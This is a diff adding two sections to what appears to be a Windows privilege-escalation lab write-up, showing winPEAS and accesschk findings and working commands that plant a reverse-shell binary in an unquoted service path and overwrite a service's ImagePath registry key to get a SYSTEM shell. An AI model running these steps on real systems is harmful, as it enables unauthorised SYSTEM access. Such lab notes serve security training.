@@ -139,7 +139,56 @@ After starting a netcat listener on kali, I can use **net start** to start the e
 ![image](https://user-images.githubusercontent.com/83407557/183125386-010dfafd-1cf5-4539-8f22-4699bd3d5e6d.png)
 
 ## Service Exploits - Unquoted Service Path
+
+  From winpeas
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183133260-43c41bbb-7682-4854-b9f5-fbe1add2c0f0.png)
+
+  ![image](https://user-images.githubusercontent.com/83407557/183133306-5fc1559d-bc63-4b98-a672-41284a4902c3.png)
+
+  
+  using accesschk to see if the services run as system
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183134005-cd8dfece-c39b-4f5d-8d19-7b02baee2cbf.png)
+
+  
+  Checking if I can write in the directories that are missing quotes but contain spaces:
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183134375-fe092d96-aedc-4f1a-9cee-50a00be5133f.png)
+
+  Since the built-in 'user' account can write in directory of the first service, I can simply copy my binary into that directory and rename it to common.exe
+  
+  `copy C:\users\user\desktop\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
+  
+  Then I can start a netcat listener on my kali machine, and restart the service on the windows target with **net start unquotedsvc**
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183135362-cf510860-0258-4762-b9a2-52b9fc8cece0.png)
+
+  ![image](https://user-images.githubusercontent.com/83407557/183135406-2790046e-9a2e-48dd-bada-c3ca7008ea3b.png)
+ 
 ## Service Exploits - Weak Registry Permissions
+
+  ![image](https://user-images.githubusercontent.com/83407557/183137613-a7ca80bd-6b80-4e12-b2d8-26210bec4b71.png)
+  
+  Checking if it this service runs as system: `sc qc regsvc`
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183137803-3594e611-1fe4-41e5-9b3c-4bae7dc42ca8.png)
+
+  *Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):*
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183137960-bbbd3fec-2022-4855-98f4-b5205455a8e9.png)
+
+  
+  Overwrite  ImagePath registry key to point to our binary
+  
+  `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\users\user\desktop\reverse.exe /f`
+  
+  Then start a netcat listener and restart(start) the service on Windows target CLI
+  
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183138531-566ea604-aca3-4fe1-8c4c-1b1aa46b38dd.png)
+
+  
 ## Service Exploits - Insecure Service Executables
 ## Registry - AutoRuns
 ## Registry - AlwaysInstallElevated
